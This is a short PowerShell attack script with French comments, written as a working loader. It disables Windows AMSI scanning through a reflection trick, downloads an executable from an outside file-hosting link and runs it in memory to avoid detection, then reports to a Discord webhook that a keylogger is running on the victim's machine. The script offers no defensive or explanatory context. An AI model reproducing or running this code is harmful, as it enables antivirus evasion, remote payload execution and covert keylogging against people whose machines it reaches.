# Bypass AMSI propre (la ligne qui marche partout en 2025)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Exécute ton exe en mémoire (0 disque, 0 détection)
$bytes = (New-Object Net.WebClient).DownloadData('https://limewire.com/d/e7ZYI#KTxZOpKpll')
$asm = [Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null,$null)

# Log Discord
iwr "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW" -Method Post -Body (@{content="Keylogger en RAM sur $env:COMPUTERNAME – logs en cours"}|ConvertTo-Json) -ContentType 'application/json'
